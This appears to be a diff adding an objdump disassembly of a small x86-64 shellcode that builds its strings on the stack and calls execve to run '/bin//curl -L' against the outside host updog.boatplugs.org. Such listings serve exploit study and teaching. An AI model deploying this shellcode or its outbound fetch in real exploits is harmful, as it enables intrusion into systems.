@@ -1,0 +1,41 @@
+
+shellcode:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 <_start>:
+  401000:	b8 58 6f 72 67       	mov    eax,0x67726f58
+  401005:	c1 e8 08             	shr    eax,0x8
+  401008:	50                   	push   rax
+  401009:	48 b8 61 74 70 6c 75 	movabs rax,0x2e7367756c707461
+  401010:	67 73 2e 
+  401013:	50                   	push   rax
+  401014:	48 b8 75 70 64 6f 67 	movabs rax,0x6f622e676f647075
+  40101b:	2e 62 6f 
+  40101e:	50                   	push   rax
+  40101f:	48 31 db             	xor    rbx,rbx
+  401022:	53                   	push   rbx
+  401023:	b8 58 58 2d 4c       	mov    eax,0x4c2d5858
+  401028:	c1 e8 10             	shr    eax,0x10
+  40102b:	50                   	push   rax
+  40102c:	48 89 e1             	mov    rcx,rsp
+  40102f:	53                   	push   rbx
+  401030:	b8 58 58 72 6c       	mov    eax,0x6c725858
+  401035:	c1 e8 10             	shr    eax,0x10
+  401038:	50                   	push   rax
+  401039:	48 b8 2f 62 69 6e 2f 	movabs rax,0x75632f2f6e69622f
+  401040:	2f 63 75 
+  401043:	50                   	push   rax
+  401044:	48 89 e7             	mov    rdi,rsp
+  401047:	53                   	push   rbx
+  401048:	48 8d 41 10          	lea    rax,[rcx+0x10]
+  40104c:	50                   	push   rax
+  40104d:	48 8d 01             	lea    rax,[rcx]
+  401050:	50                   	push   rax
+  401051:	57                   	push   rdi
+  401052:	48 89 e6             	mov    rsi,rsp
+  401055:	48 31 d2             	xor    rdx,rdx
+  401058:	48 31 c0             	xor    rax,rax
+  40105b:	b0 3b                	mov    al,0x3b
+  40105d:	0f 05                	syscall
